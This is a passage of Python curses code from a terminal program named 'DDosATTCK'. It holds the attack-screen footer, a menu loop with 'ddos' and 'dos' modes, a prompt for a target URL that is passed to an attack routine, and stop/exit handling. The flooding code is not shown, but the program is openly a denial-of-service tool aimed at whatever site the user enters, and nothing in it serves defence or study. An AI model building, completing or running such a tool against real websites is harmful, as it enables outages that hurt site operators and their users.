                stdscr.addstr(log_y + 1 + i, 2, line[-w+4:], curses.color_pair(4))
            except:
                pass

        # ─── FOOTER ───
        footer = "[Q] Stop Attack  |  [P]ause  |  [S]tatus"
        try:
            stdscr.addstr(h - 2, max(0, w // 2 - len(footer) // 2), footer, curses.color_pair(3) | curses.A_DIM)
        except:
            pass

        stdscr.refresh()
        key = stdscr.getch()
        if key in [ord('q'), ord('Q')]:
            running = False
        time.sleep(0.05)

    stop_attack()
    return "menu"

# ─── MAIN ─────────────────────────────────────────────────────────────────

def main(stdscr):
    # Setup
    curses.curs_set(0)
    init_colors()

    # Splash
    splash_screen(stdscr)

    while True:
        choice = menu_screen(stdscr)
        if choice == "exit":
            break
        elif choice in ("ddos", "dos"):
            url = target_input(stdscr, choice)
            if url:
                result = attack_screen(stdscr, choice, url)

    # Exit screen
    stdscr.clear()
    h, w = stdscr.getmaxyx()
    msg = "DDosATTCK terminated. Stay sharp."
    try:
        stdscr.addstr(h // 2, max(0, w // 2 - len(msg) // 2), msg, curses.color_pair(1) | curses.A_BOLD)
    except:
        pass
    stdscr.refresh()
    time.sleep(1.5)

if __name__ == "__main__":
    try:
        curses.wrapper(main)
    except KeyboardInterrupt:
        stop_attack()
        sys.exit(0)
